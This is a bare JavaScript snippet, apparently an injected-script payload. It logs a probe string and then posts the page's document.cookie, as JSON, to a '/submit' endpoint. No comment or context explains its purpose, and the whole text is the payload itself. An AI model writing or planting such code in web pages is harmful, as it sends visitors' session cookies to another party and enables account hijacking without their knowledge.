
console.log("a");
fetch('/submit', {
    method: 'POST',
    body: JSON.stringify({
        message: document.cookie,
    }),
    headers: {
        'Content-Type': 'application/json',
    },
})
